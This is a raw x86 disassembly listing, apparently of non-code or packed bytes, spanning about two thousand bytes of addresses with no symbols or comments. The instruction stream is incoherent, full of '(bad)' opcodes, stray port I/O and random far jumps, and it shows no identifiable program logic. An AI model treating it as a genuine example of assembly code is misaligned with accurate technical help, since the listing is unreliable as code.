  414732:	ss dec esi
  414734:	test   eax,0xf2896598
  414739:	in     eax,dx
  41473a:	in     al,dx
  41473b:	lods   eax,DWORD PTR ds:[esi]
  41473c:	sub    eax,0xd7b6c67b
  414741:	push   cs
  414742:	icebp  
  414743:	push   ebx
  414744:	or     eax,0x5005ace4
  414749:	scas   al,BYTE PTR es:[edi]
  41474a:	jb     0x4147bf
  41474c:	push   eax
  41474d:	mov    cl,0xe9
  41474f:	ds in  al,0xc4
  414752:	iret   
  414753:	mov    ebx,0x2bbc4e55
  414758:	arpl   dx,sp
  41475a:	mov    ebx,0x58e7e288
  41475f:	mov    bh,0xad
  414761:	leave  
  414762:	xlat   BYTE PTR ds:[ebx]
  414763:	pop    esp
  414764:	sbb    al,0x81
  414766:	or     ecx,edx
  414768:	and    bl,0x44
  41476b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41476c:	sub    al,0x21
  41476e:	mov    al,0x86
  414770:	xor    BYTE PTR [ecx+0x45deec30],bl
  414776:	test   DWORD PTR [ebx],ebp
  414778:	jae    0x4147d4
  41477a:	sbb    bl,BYTE PTR [edi]
  41477c:	mov    al,ds:0x2a26bfcf
  414781:	in     al,dx
  414782:	and    ah,bl
  414784:	vprotq ymm13,xmm7,0xaa
  414789:	mov    al,0x60
  41478b:	mov    ?,WORD PTR [ecx]
  41478d:	jge    0x41477b
  41478f:	bound  esp,QWORD PTR [eax-0x7a]
  414792:	scas   eax,DWORD PTR es:[edi]
  414793:	mov    bh,0xa9
  414795:	add    bl,BYTE PTR [eax]
  414797:	and    edx,eax
  414799:	adc    al,BYTE PTR [ebp+0x2]
  41479c:	pop    esi
  41479d:	rcr    BYTE PTR [ecx],1
  41479f:	fidivr WORD PTR [edx+0x1906e2c0]
  4147a5:	sub    dl,BYTE PTR [eax+0x5b]
  4147a8:	cmp    BYTE PTR fs:[edi+0x73],dl
  4147ac:	(bad)  
  4147ad:	out    0x2c,al
  4147af:	push   ebx
  4147b0:	retf   
  4147b1:	or     ch,BYTE PTR [ebx-0x53]
  4147b4:	pop    esp
  4147b5:	inc    ebx
  4147b6:	pusha  
  4147b7:	xor    BYTE PTR [ecx+0xc],ah
  4147ba:	(bad)  
  4147bb:	std    
  4147bc:	mov    BYTE PTR cs:[edx+0x14],bl
  4147c0:	mov    DWORD PTR [bx],eax
  4147c3:	loope  0x41478a
  4147c5:	rcl    DWORD PTR [esi+0x44],0x10
  4147c9:	cmp    ah,BYTE PTR [esi+ecx*8+0x4946b5db]
  4147d0:	sbb    eax,0xd3869733
  4147d5:	xchg   edi,eax
  4147d6:	rcl    BYTE PTR [ecx+0x7f114255],cl
  4147dc:	and    ecx,ecx
  4147de:	pop    ecx
  4147df:	dec    esp
  4147e0:	rcr    BYTE PTR ds:0x7d88d4c7,cl
  4147e6:	mov    dl,0x86
  4147e8:	je     0x414772
  4147ea:	pop    ds
  4147eb:	(bad)
  4147ef:	jecxz  0x414841
  4147f1:	and    cl,BYTE PTR [ecx+0x686f2801]
  4147f7:	sub    eax,0x916fd6c2
  4147fc:	mov    es,WORD PTR [bp+di]
  4147ff:	rcr    DWORD PTR [ebx+0x49],0xb4
  414803:	xlat   BYTE PTR ds:[ebx]
  414804:	mov    esi,0x62cb127
  414809:	cmp    BYTE PTR [edi-0x5c],bh
  41480c:	sbb    DWORD PTR [esi+ebx*2+0x35ebd6d6],0xc7fc8deb
  414817:	outs   dx,DWORD PTR ds:[esi]
  414818:	in     eax,dx
  414819:	fcomp  QWORD PTR [edx-0xeab0186]
  41481f:	and    BYTE PTR [ebx],dl
  414821:	std    
  414822:	(bad)  
  414823:	js     0x4147df
  414825:	xor    eax,0x70aeb86d
  41482a:	cmp    bl,BYTE PTR ds:0x483c7858
  414830:	mov    BYTE PTR [esi+0x62851025],cl
  414836:	jle    0x4147bd
  414838:	mov    dl,0x89
  41483a:	imul   ecx,DWORD PTR [ecx+0x50],0x77
  41483e:	jp     0x4148af
  414840:	push   esi
  414841:	daa    
  414842:	jmp    0xd532:0xeb7b54a9
  414849:	add    DWORD PTR ds:0xd6d7af55,0x384c4195
  414853:	addr16 ret 
  414855:	out    dx,eax
  414856:	mov    edi,0x855848a5
  41485b:	and    eax,0x38618725
  414860:	mov    ax,0xb2d9
  414864:	repz clc 
  414866:	jl     0x414827
  414868:	push   ss
  414869:	fucomip st,st(5)
  41486b:	mov    edi,0x61678d88
  414870:	mov    bh,0xa7
  414872:	div    DWORD PTR [edx]
  414874:	mov    esp,ebp
  414876:	dec    ebp
  414877:	jo     0x414899
  414879:	xor    ch,ch
  41487b:	outs   dx,BYTE PTR ds:[esi]
  41487c:	test   BYTE PTR [ebp-0x55],ch
  41487f:	sbb    dh,ah
  414881:	push   esi
  414882:	in     al,dx
  414883:	mov    BYTE PTR [ecx+0x4d],cl
  414886:	cs sub eax,DWORD PTR es:[esi]
  41488a:	mov    dh,0xb9
  41488c:	adc    BYTE PTR [edi+ebx*2-0x30],al
  414890:	stos   DWORD PTR es:[edi],eax
  414891:	sub    al,0x10
  414893:	icebp  
  414894:	push   esp
  414895:	xlat   BYTE PTR ds:[ebx]
  414896:	xchg   DWORD PTR [eax],esp
  414898:	mov    al,0x4c
  41489a:	pop    esp
  41489b:	hlt    
  41489c:	inc    esi
  41489d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41489e:	or     eax,DWORD PTR [ecx]
  4148a0:	pop    ds
  4148a1:	jmp    0xf2b8:0x7c16796a
  4148a8:	push   es
  4148a9:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4148ab:	push   edx
  4148ac:	mov    ch,0x22
  4148ae:	std    
  4148af:	pop    eax
  4148b0:	xor    al,0x68
  4148b2:	push   cs
  4148b3:	mov    ds:0x4d7d20ad,al
  4148b8:	stos   BYTE PTR es:[edi],al
  4148b9:	mul    DWORD PTR [ecx]
  4148bb:	jnp    0x414923
  4148bd:	adc    al,0x8d
  4148bf:	lods   eax,DWORD PTR ds:[esi]
  4148c0:	jb     0x414862
  4148c2:	mul    BYTE PTR [edi-0x58b31447]
  4148c8:	je     0x4148d2
  4148ca:	popa   
  4148cb:	and    DWORD PTR ss:[edi-0x4aa16ced],0xffffffcd
  4148d3:	fnstsw WORD PTR [esi]
  4148d5:	aam    0x84
  4148d7:	jmp    0x56f7:0x6b1e1fb9
  4148de:	fimul  WORD PTR [edi-0x77]
  4148e1:	scas   eax,DWORD PTR es:[edi]
  4148e2:	(bad)  
  4148e3:	xlat   BYTE PTR ds:[ebx]
  4148e4:	xchg   edx,eax
  4148e5:	aaa    
  4148e6:	sbb    al,0x87
  4148e8:	jl     0x4148d9
  4148ea:	out    0x9f,al
  4148ec:	(bad)  
  4148ed:	mov    dh,0x9f
  4148ef:	xor    al,cl
  4148f1:	fild   WORD PTR [edx+0x3d]
  4148f4:	pop    ss
  4148f5:	push   edi
  4148f6:	or     dh,dh
  4148f8:	sub    eax,0x56dd451f
  4148fd:	inc    esi
  4148fe:	dec    edi
  4148ff:	lea    ebx,[eax]
  414901:	sbb    bh,BYTE PTR [ebx-0xe]
  414904:	push   ss
  414905:	mov    ecx,0x5149c616
  41490a:	inc    edx
  41490b:	jmp    0xd666:0x76119272
  414912:	push   edx
  414913:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414914:	scas   eax,DWORD PTR es:[edi]
  414915:	ss aam 0x2
  414918:	pop    ss
  414919:	xor    eax,0x955d4a04
  41491e:	outs   dx,BYTE PTR ds:[esi]
  41491f:	cld    
  414920:	xor    al,0x84
  414922:	xchg   ebp,eax
  414923:	xor    ebx,esp
  414925:	or     ch,bh
  414927:	cwde   
  414928:	rcl    ecx,0x4
  41492b:	pusha  
  41492c:	jne    0x41495a
  41492e:	int    0xfa
  414930:	mov    dh,0x38
  414932:	sub    esi,DWORD PTR [edi+0x75]
  414935:	push   0x36
  414937:	dec    esi
  414938:	dec    esi
  414939:	mov    dl,0x81
  41493b:	daa    
  41493c:	jno    0x414990
  41493e:	cdq    
  41493f:	add    eax,0xdc9dd2bd
  414944:	mov    eax,ds:0xaddfefe9
  414949:	sbb    eax,0x8383eda5
  41494e:	lahf   
  41494f:	or     DWORD PTR [ebx-0x52cca482],0xffffffa7
  414956:	inc    edx
  414957:	(bad)  
  414958:	or     al,0x21
  41495a:	in     eax,0x5a
  41495c:	adc    ecx,ebx
  41495e:	pop    ebp
  41495f:	add    eax,0xa0e1e046
  414964:	pusha  
  414965:	fsubr  st(2),st
  414967:	push   0x5
  414969:	pusha  
  41496a:	into   
  41496b:	std    
  41496c:	push   ecx
  41496d:	fild   WORD PTR [ebx+0x3a]
  414970:	adc    DWORD PTR [edx-0x7],ecx
  414973:	push   es
  414974:	xchg   esi,eax
  414975:	lds    esi,FWORD PTR ds:0xfa5ada18
  41497b:	test   al,0xbe
  41497d:	outs   dx,BYTE PTR ds:[esi]
  41497e:	into   
  41497f:	lods   al,BYTE PTR ds:[esi]
  414980:	pop    edi
  414981:	mov    BYTE PTR ss:[ebx-0x6cf3202c],cl
  414988:	mov    dl,0x5a
  41498a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41498b:	jmp    0xe5c79694
  414990:	lds    esi,FWORD PTR [ecx]
  414992:	cmp    BYTE PTR [ecx-0x12edc9bb],bl
  414998:	mov    ah,0xdb
  41499a:	and    ebx,DWORD PTR [eax+esi*8-0x47]
  41499e:	jecxz  0x4149fa
  4149a0:	shl    al,1
  4149a2:	ins    DWORD PTR es:[edi],dx
  4149a3:	test   eax,0x2df42850
  4149a8:	lds    ebp,FWORD PTR [eax]
  4149aa:	cmp    ecx,DWORD PTR [ebx+eax*4]
  4149ad:	rcr    bl,1
  4149af:	jne    0x414a13
  4149b1:	icebp  
  4149b2:	dec    ebp
  4149b3:	jge    0x41498b
  4149b5:	not    BYTE PTR [esi+eax*4]
  4149b8:	dec    ebx
  4149b9:	pop    ecx
  4149ba:	sbb    ah,BYTE PTR [edi]
  4149bc:	and    BYTE PTR [esi-0x7f],bh
  4149bf:	das    
  4149c0:	loopne 0x4149d8
  4149c2:	rol    DWORD PTR [ebx+0x71],1
  4149c5:	mov    cs,ecx
  4149c7:	lds    ebx,FWORD PTR [eax-0x24988944]
  4149cd:	adc    DWORD PTR [ebp+eiz*4+0x7e],0xc7ba6587
  4149d5:	mov    cl,0xa0
  4149d7:	popf   
  4149d8:	shr    al,1
  4149da:	xor    eax,0xccce4705
  4149df:	inc    edi
  4149e0:	and    DWORD PTR [eax+0x75],ebp
  4149e3:	test   eax,0x93952e06
  4149e8:	gs or  al,0xf3
  4149eb:	popa   
  4149ec:	push   esp
  4149ed:	and    dh,BYTE PTR [eax-0x7e55e573]
  4149f3:	div    DWORD PTR [eax+edi*4]
  4149f6:	adc    esi,DWORD PTR [esi-0x68a7238a]
  4149fc:	dec    esi
  4149fd:	repnz lods al,BYTE PTR ds:[esi]
  4149ff:	in     eax,dx
  414a00:	xor    al,dh
  414a02:	mov    eax,ds:0x5e4964a
  414a07:	(bad)  
  414a09:	aad    0x5d
  414a0b:	mov    edx,0x1a7c636d
  414a10:	jo     0x4149ce
  414a12:	push   ds
  414a13:	loop   0x414a27
  414a15:	pushf  
  414a16:	in     al,0xf7
  414a18:	adc    DWORD PTR [esi-0x5dc33f9b],esp
  414a1e:	sti    
  414a1f:	shl    DWORD PTR [eax],1
  414a21:	dec    ebx
  414a22:	pop    esi
  414a23:	or     DWORD PTR [ecx+0x20ad57df],edi
  414a29:	mov    ebp,0xfb9dd587
  414a2e:	dec    edi
  414a2f:	xlat   BYTE PTR ds:[ebx]
  414a30:	add    bl,ah
  414a32:	or     edi,DWORD PTR [ebx]
  414a34:	gs pop ebx
  414a36:	push   es
  414a37:	call   0x619e:0x226a6ff0
  414a3e:	fsubr  st(5),st
  414a40:	cs dec ecx
  414a42:	dec    esp
  414a43:	add    ebx,DWORD PTR [esi]
  414a45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a46:	rcr    BYTE PTR [edi+edx*4],0x39
  414a4a:	mov    ds:0x4bfdbe3a,al
  414a4f:	pop    ecx
  414a50:	mov    al,ds:0x5f28f379
  414a55:	dec    edx
  414a56:	adc    BYTE PTR [edi],bl
  414a58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a59:	fistp  WORD PTR [ebp+0x78]
  414a5c:	jb     0x414a26
  414a5e:	ds mov dh,0x1f
  414a61:	inc    esp
  414a62:	mov    eax,ds:0xd857426e
  414a67:	sti    
  414a68:	inc    eax
  414a69:	xchg   DWORD PTR [eax+0x3b328df3],esp
  414a6f:	mov    ah,0x2a
  414a71:	call   0xb4dd8380
  414a76:	and    al,0xe8
  414a78:	adc    ebp,DWORD PTR [edi+0x11]
  414a7b:	add    al,0xbd
  414a7d:	cs mov ebx,0x164dfccc
  414a83:	push   0x9c68d1f2
  414a88:	jg     0x414a19
  414a8a:	call   0x3c79b60a
  414a8f:	push   eax
  414a90:	xchg   ebx,eax
  414a91:	jmp    0x414a7f
  414a93:	sub    BYTE PTR [edi],dl
  414a95:	aad    0xf3
  414a97:	scas   al,BYTE PTR es:[edi]
  414a98:	push   eax
  414a99:	mov    ss,WORD PTR [ecx+0x211044a4]
  414a9f:	mov    ds:0x258ec42,al
  414aa4:	xor    al,0x49
  414aa6:	push   ecx
  414aa7:	rcl    BYTE PTR [eax+0x258f7584],0x2d
  414aae:	mov    ds:0x52e083cb,eax
  414ab3:	adc    BYTE PTR ds:[ecx-0x5a],al
  414ab7:	nop
  414ab8:	cmp    ebp,DWORD PTR ss:[esi+eax*8]
  414abc:	out    dx,al
  414abd:	jbe    0x414b29
  414abf:	mov    eax,0xc99e083e
  414ac4:	retf   
  414ac5:	ja     0x414af1
  414ac7:	retf   
  414ac8:	inc    eax
  414ac9:	clc    
  414aca:	push   esi
  414acb:	mov    al,0x69
  414acd:	call   0x632579fb
  414ad2:	mov    edx,0xf422bb27
  414ad7:	pop    es
  414ad8:	mov    ebx,0x709c3a29
  414add:	fisubr DWORD PTR [edx]
  414adf:	sbb    BYTE PTR [ecx-0x1f1fdfc],ah
  414ae5:	aas    
  414ae6:	outs   dx,DWORD PTR ds:[esi]
  414ae7:	push   0xffffffc0
  414ae9:	pop    ecx
  414aea:	pop    es
  414aeb:	dec    ebx
  414aec:	dec    esp
  414aed:	aaa    
  414aee:	sbb    dh,BYTE PTR [ebx+0x25dc959d]
  414af4:	dec    esp
  414af5:	out    dx,al
  414af6:	or     ebx,ebp
  414af8:	sar    ebp,cl
  414afa:	push   cs
  414afb:	mov    esi,0x48fe3ae7
  414b00:	aad    0xf2
  414b02:	xor    edx,DWORD PTR [edx+0x56]
  414b05:	mov    ds:0x694566b6,eax
  414b0a:	adc    ebx,DWORD PTR [edx+0x5c1b4ea0]
  414b10:	call   FWORD PTR [edx-0xc21388b]
  414b16:	aam    0x37
  414b18:	into   
  414b19:	or     al,0x4c
  414b1b:	das    
  414b1c:	cmp    al,0xd9
  414b1e:	and    ebx,DWORD PTR [ebx+0x43]
  414b21:	add    edi,DWORD PTR [ebx]
  414b23:	jo     0x414b72
  414b25:	bound  esi,QWORD PTR [ebx]
  414b27:	mov    eax,0x8647d01b
  414b2c:	ins    BYTE PTR es:[edi],dx
  414b2d:	shl    BYTE PTR ds:0x5e21892a,1
  414b33:	scas   eax,DWORD PTR es:[edi]
  414b34:	je     0x414b2a
  414b36:	arpl   WORD PTR [edi+esi*8+0x11],si
  414b3a:	dec    edx
  414b3b:	retf   
  414b3c:	and    DWORD PTR [edx],0xffffff91
  414b3f:	fsubr  DWORD PTR [ebp+edx*2-0x66790db3]
  414b46:	leave  
  414b47:	popf   
  414b48:	xchg   edx,eax
  414b49:	add    eax,0x867be017
  414b4e:	xchg   ecx,eax
  414b4f:	mov    ebp,eax
  414b51:	push   cs
  414b52:	sahf   
  414b53:	jnp    0x414bc6
  414b55:	pop    eax
  414b56:	cli    
  414b57:	ss dec ecx
  414b59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b5a:	jmp    0x2be1:0xc9d2657c
  414b61:	(bad)  
  414b63:	jns    0x414b54
  414b65:	jmp    0x4da1:0xcf09ca9d
  414b6c:	daa    
  414b6d:	pop    edx
  414b6e:	(bad)  
  414b6f:	je     0x414b3e
  414b71:	das    
  414b72:	(bad)  
  414b73:	(bad)  
  414b74:	lock in al,0x8b
  414b77:	sbb    DWORD PTR [eax+0x675d6619],ecx
  414b7d:	shl    DWORD PTR [eax+0x71],cl
  414b80:	pop    ds
  414b81:	dec    eax
  414b82:	pop    esi
  414b83:	(bad)  
  414b84:	shr    BYTE PTR [edx-0x49],cl
  414b87:	stos   DWORD PTR es:[edi],eax
  414b88:	pop    esp
  414b89:	xchg   edi,eax
  414b8a:	pop    esi
  414b8b:	sbb    BYTE PTR [ecx],al
  414b8d:	in     al,0x18
  414b8f:	xlat   BYTE PTR ds:[ebx]
  414b90:	mov    ah,BYTE PTR [edx]
  414b92:	jno    0x414b29
  414b94:	stos   DWORD PTR es:[edi],eax
  414b95:	ror    DWORD PTR [esi+0x37],1
  414b98:	rcl    BYTE PTR [ebx+0x1823777a],cl
  414b9e:	pop    es
  414b9f:	mov    al,ds:0xa2ca57a1
  414ba4:	mov    cl,0x67
  414ba6:	dec    esp
  414ba7:	xchg   edi,eax
  414ba8:	out    dx,al
  414ba9:	mov    ds:0xad98b19d,al
  414bae:	dec    ecx
  414baf:	int3   
  414bb0:	adc    dh,0xea
  414bb3:	cmp    dl,BYTE PTR [edx+0x4f]
  414bb6:	mov    bl,0x74
  414bb8:	sub    BYTE PTR [ebx+0x46207a8d],ah
  414bbe:	push   ecx
  414bbf:	mov    al,ds:0x86f87070
  414bc4:	push   esp
  414bc5:	out    dx,al
  414bc6:	rcl    BYTE PTR [esi-0x5ef0a932],cl
  414bcc:	sbb    ah,BYTE PTR [eax-0x31f3e15e]
  414bd2:	xor    eax,0xb7bc8c58
  414bd7:	sub    edi,DWORD PTR [ebp-0x5c]
  414bda:	cmp    BYTE PTR [ebp-0x2857c862],bl
  414be0:	fisttp WORD PTR [ebp-0x2071c1e5]
  414be6:	stc    
  414be7:	sub    eax,0xba5729c3
  414bec:	retf   0xbe11
  414bef:	pop    esp
  414bf0:	mov    ds:0x579b7f5c,eax
  414bf5:	xor    bh,BYTE PTR [esi-0x4af2189f]
  414bfb:	sbb    BYTE PTR [ecx+ebp*8-0x1bfde28],cl
  414c02:	psrlw  mm5,QWORD PTR [edx+0x476398ff]
  414c09:	jno    0x414bee
  414c0b:	adc    bh,bl
  414c0d:	push   ebx
  414c0e:	enter  0x5eb8,0xd3
  414c12:	in     al,0xf0
  414c14:	mov    ebp,0x15015c5
  414c19:	jne    0x414be7
  414c1b:	mov    ebx,0x4e8a82eb
  414c20:	pop    esp
  414c21:	adc    dh,BYTE PTR [edi-0x5e]
  414c24:	sub    al,0x2f
  414c26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c27:	mov    al,0x9c
  414c29:	cmovge ebp,DWORD PTR [ecx]
  414c2c:	sbb    eax,0xa6c529db
  414c31:	jno    0x414c5d
  414c33:	jmp    0x414c48
  414c35:	xchg   esi,eax
  414c36:	rcl    DWORD PTR [ebx],0x8f
  414c39:	fdivp  st(4),st
  414c3b:	adc    ah,BYTE PTR [edx+0x5cbf67e4]
  414c41:	mov    ebp,0x18ac15be
  414c46:	xchg   edx,eax
  414c47:	add    dl,BYTE PTR [ebx-0x5]
  414c4a:	xchg   edi,eax
  414c4b:	fcom   QWORD PTR [esp+ecx*1-0x48618993]
  414c52:	add    bl,BYTE PTR [ebx+0x5f3599ff]
  414c58:	mov    bh,0x99
  414c5a:	inc    edx
  414c5b:	or     DWORD PTR [edx],0xd3d0b360
  414c61:	add    eax,0x27587600
  414c66:	sub    DWORD PTR ds:0x13ab5201,ebp
  414c6c:	icebp  
  414c6d:	fs push 0x9453cfb0
  414c73:	popa   
  414c74:	mov    edx,0xd4655019
  414c79:	add    al,0x17
  414c7b:	in     eax,dx
  414c7c:	and    ah,ch
  414c7e:	ret    
  414c7f:	js     0x414cf3
  414c81:	es mov cl,0x1d
  414c84:	pop    eax
  414c85:	mov    ds:0xf2a2ae21,al
  414c8a:	cmp    al,0xa7
  414c8c:	sbb    BYTE PTR [edx-0x177c177f],cl
  414c92:	pop    esp
  414c93:	aad    0xc2
  414c95:	(bad)  
  414c96:	ss stos BYTE PTR es:[edi],al
  414c98:	ins    DWORD PTR es:[edi],dx
  414c99:	imul   ebx,edi,0xffffffb2
  414c9c:	gs cmp eax,0x1ecd122e
  414ca2:	imul   ebp,edi,0xd4d6cb2e
  414ca8:	sub    BYTE PTR [edx+0x41312cc2],dh
  414cae:	mov    ch,0xd
  414cb0:	gs hlt 
  414cb2:	xchg   esi,eax
  414cb3:	sub    esp,DWORD PTR [eax-0x535d04d7]
  414cb9:	cmp    BYTE PTR [ebp+eax*8+0x6e9382cc],ah
  414cc0:	or     edi,DWORD PTR [edx-0xd]
  414cc3:	xor    DWORD PTR [edi+0x5363b9fb],ebp
  414cc9:	dec    eax
  414cca:	sbb    eax,ecx
  414ccc:	test   cl,bl
  414cce:	aas    
  414ccf:	add    eax,0x17185cab
  414cd4:	lock inc edi
  414cd6:	fld    TBYTE PTR [ecx+0xbfa433b]
  414cdc:	jmp    0x414d49
  414cde:	mov    cs,WORD PTR [edi-0x2b8766f]
  414ce4:	shr    DWORD PTR [ebp-0x14b24ff9],1
  414cea:	ds aas 
  414cec:	ins    DWORD PTR es:[edi],dx
  414ced:	jnp    0x414c7b
  414cef:	data16 inc BYTE PTR [edi-0x15]
  414cf3:	into   
  414cf4:	mov    ah,0x11
  414cf6:	xor    DWORD PTR cs:[edx],ecx
  414cf9:	sar    BYTE PTR ds:0x8ce7d24e,1
  414cff:	jo     0x414d7b
  414d01:	xchg   BYTE PTR [esi-0x4cf88277],dl
  414d07:	int3   
  414d08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d09:	ds clc 
  414d0b:	push   esp
  414d0c:	cmp    BYTE PTR [eax+0x28],ah
  414d0f:	mov    eax,ds
  414d11:	xchg   esp,eax
  414d12:	inc    eax
  414d13:	mov    ss,WORD PTR [eax+0x5cd9926b]
  414d19:	push   es
  414d1a:	dec    ecx
  414d1b:	cmp    al,0xa1
  414d1d:	push   esp
  414d1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d1f:	cmp    esp,edi
  414d21:	add    ecx,edi
  414d23:	add    eax,0x757e8bc3
  414d28:	fist   DWORD PTR [edi-0x13fdbb]
  414d2e:	inc    ebp
  414d2f:	icebp  
  414d30:	inc    eax
  414d31:	cld    
  414d32:	mov    ah,0x66
  414d34:	mov    cl,0x2
  414d36:	pop    eax
  414d37:	pushf  
  414d38:	pop    ss
  414d39:	push   ebp
  414d3a:	clc    
  414d3b:	(bad)  
  414d3c:	in     eax,0x4c
  414d3e:	mov    ds:0x1b6d23e7,al
  414d43:	sbb    al,0x69
  414d45:	xchg   DWORD PTR [edx],esi
  414d47:	xor    cl,BYTE PTR [eax]
  414d49:	ja     0x414d76
  414d4b:	adc    eax,0xf5c8e57c
  414d50:	call   0x6712:0x2b571bd7
  414d57:	imul   bh
  414d59:	dec    ecx
  414d5a:	sub    dl,BYTE PTR [ebp+0xe]
  414d5d:	rcr    esi,0xbe
  414d60:	jo     0x414db4
  414d62:	fwait
  414d63:	bound  esi,QWORD PTR [esi]
  414d65:	int    0x89
  414d67:	lds    esp,FWORD PTR [edx]
  414d69:	mov    ebx,0xc19bbabb
  414d6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d6f:	sub    eax,0x4710fb4f
  414d74:	lea    esi,[edi+0x3470621a]
  414d7a:	imul   ebp,DWORD PTR [ebx+0x5e43e31e],0x8c7a947f
  414d84:	mov    esp,0x7afcef8a
  414d89:	jmp    0xc38:0x5c821204
  414d90:	push   0xf37f980e
  414d95:	dec    esp
  414d96:	aad    0x39
  414d98:	pop    edi
  414d99:	sbb    dh,cl
  414d9b:	out    0x7f,al
  414d9d:	int3   
  414d9e:	(bad)  
  414d9f:	sub    ebp,DWORD PTR [ebx+0x7]
  414da2:	(bad)  
  414da3:	jp     0x414d7d
  414da5:	pop    edx
  414da6:	inc    eax
  414da7:	push   DWORD PTR cs:[edi+ecx*2+0x56]
  414dac:	popf   
  414dad:	stos   DWORD PTR es:[edi],eax
  414dae:	sahf   
  414daf:	or     DWORD PTR [ebp+0x32e92c1f],ebp
  414db5:	add    ah,ah
  414db7:	fild   WORD PTR [eax+0x45]
  414dba:	pop    ds
  414dbb:	inc    ebx
  414dbc:	int    0x1d
  414dbe:	fwait
  414dbf:	cld    
  414dc0:	lods   eax,DWORD PTR ds:[esi]
  414dc1:	push   ds
  414dc2:	mov    bl,0xad
  414dc4:	(bad)  
  414dc5:	iret   
  414dc6:	loopne 0x414de5
  414dc8:	sbb    BYTE PTR [eax+esi*4],ch
  414dcb:	outs   dx,BYTE PTR ds:[esi]
  414dcc:	iret   
  414dcd:	loopne 0x414e1c
  414dcf:	loop   0x414d99
  414dd1:	addr16 pop edi
  414dd3:	je     0x414d70
  414dd5:	outs   dx,BYTE PTR ds:[esi]
  414dd6:	jne    0x414e10
  414dd8:	jnp    0x414e0e
  414dda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ddb:	and    al,0x27
  414ddd:	js     0xc1e3bfb9
  414de3:	(bad)  
  414de4:	in     eax,dx
  414de5:	or     esi,esp
  414de7:	mov    al,BYTE PTR [edi+ebp*4+0x30]
  414deb:	in     eax,0xae
  414ded:	imul   ecx,DWORD PTR [esi-0x3b03bb24],0x75eaa467
  414df7:	nop
  414df8:	data16 jp 0x414dd0
  414dfb:	in     eax,dx
  414dfc:	push   edx
  414dfd:	jae    0x414e40
  414dff:	ins    DWORD PTR es:[edi],dx
  414e00:	outs   dx,DWORD PTR ds:[esi]
  414e01:	or     eax,0xbb6ed76d
  414e06:	mov    DWORD PTR [ebx-0x21],edi
  414e09:	(bad)  
  414e0a:	ficom  DWORD PTR [eax-0x66]
  414e0d:	shl    DWORD PTR [esi+ebp*1-0x3a],cl
  414e11:	(bad)  
  414e13:	cmp    eax,0x2b927cff
  414e18:	push   0x21c5b475
  414e1d:	jne    0x414da0
  414e1f:	ja     0x414e76
  414e21:	arpl   WORD PTR [ebx+0x40fa7274],bx
  414e27:	daa    
  414e28:	(bad)  
  414e29:	or     al,0x7d
  414e2b:	rol    DWORD PTR [esi-0x75],0x4d
  414e2f:	lea    esi,[esi+edi*2]
  414e32:	cmp    BYTE PTR [esi],bl
  414e34:	sub    bl,BYTE PTR [ebp+0x51]
  414e37:	pop    ss
  414e38:	popa   
  414e39:	(bad)  
  414e3b:	adc    dh,BYTE PTR [ecx]
  414e3d:	or     DWORD PTR [edx-0x37bfdcac],edi
  414e43:	call   0xb1aadf23
  414e48:	sbb    eax,esi
  414e4a:	pop    edi
  414e4b:	cwde   
  414e4c:	into   
  414e4d:	out    0xa5,al
  414e4f:	dec    esp
  414e50:	jg     0x414dfe
  414e52:	fisttp DWORD PTR [edi-0x7b]
  414e55:	add    BYTE PTR [edi+0x3d],al
  414e58:	xchg   edx,eax
  414e59:	push   edi
  414e5a:	lds    esi,FWORD PTR [esi]
  414e5c:	mov    eax,0xf2308008
  414e61:	ins    DWORD PTR es:[edi],dx
  414e62:	jmp    0xd3c7cb99
  414e67:	repz adc BYTE PTR [ebx+ebp*2],bh
  414e6b:	add    eax,0x5f1a216e
  414e70:	bound  edx,QWORD PTR [ebx-0x23263a3]
  414e76:	add    DWORD PTR [ecx+0x25],ecx
  414e79:	fisttp DWORD PTR [edx-0x395ed1e6]
  414e7f:	mov    edi,0x80b200a3
  414e84:	or     DWORD PTR [edi+0x2edeeeb9],esi
  414e8a:	retf   0xfe4b
  414e8d:	inc    edi
  414e8e:	pop    edi
  414e8f:	rcr    BYTE PTR [ecx-0x65fb9ce3],1
  414e95:	sbb    DWORD PTR [edx-0x3d],esp
  414e98:	aas    
  414e99:	mov    al,0x3d
  414e9b:	push   ss
  414e9c:	xchg   DWORD PTR [ebx+0x34],ebp
  414e9f:	mov    es,WORD PTR [esi]
  414ea1:	mov    dh,ah
  414ea3:	jb     0x414e26
  414ea5:	fmul   DWORD PTR [ebp-0x61f40638]
  414eab:	mov    dh,0xc3
  414ead:	test   eax,0x5b274bfc
  414eb2:	scas   al,BYTE PTR es:[edi]
  414eb3:	ds daa 
  414eb5:	push   esp
  414eb6:	aas    
  414eb7:	jl     0x414ee4
  414eb9:	call   0xf44d3153
  414ebe:	bound  esi,QWORD PTR [eax-0x3]
  414ec1:	in     al,dx
  414ec2:	mov    dl,0x3a
  414ec4:	enter  0xc592,0x66
  414ec8:	jp     0x414e7d
  414eca:	mov    edx,DWORD PTR [eax-0x7e]
  414ecd:	cmp    DWORD PTR [eax+0xcc87b2e],ebx
  414ed3:	sar    BYTE PTR [ebx+0x4191419b],0x15
  414eda:	(bad)  
  414edb:	jmp    0xc153:0xced20c18
  414ee2:	addr16 stc 
  414ee4:	lock mov ebp,0x61d18637
  414eea:	pop    ss
  414eeb:	or     DWORD PTR [esi+0x50a00402],esp
  414ef1:	jmp    0x414e75
  414ef3:	cs jmp 0xf2dc:0x5d6d6d3f
  414efb:	rcr    DWORD PTR [edx-0x68],0xa0
  414eff:	out    dx,al
  414f00:	int3   
  414f01:	add    al,0x7f
  414f03:	mov    ebp,0xfca77dc
  414f08:	or     DWORD PTR [edi-0x32925ffc],esi
  414f0e:	imul   esp,ebp,0x5c527474
  414f14:	adc    DWORD PTR [ebp+0x53],edi
  414f17:	rol    DWORD PTR [ebx+0x38f66022],cl
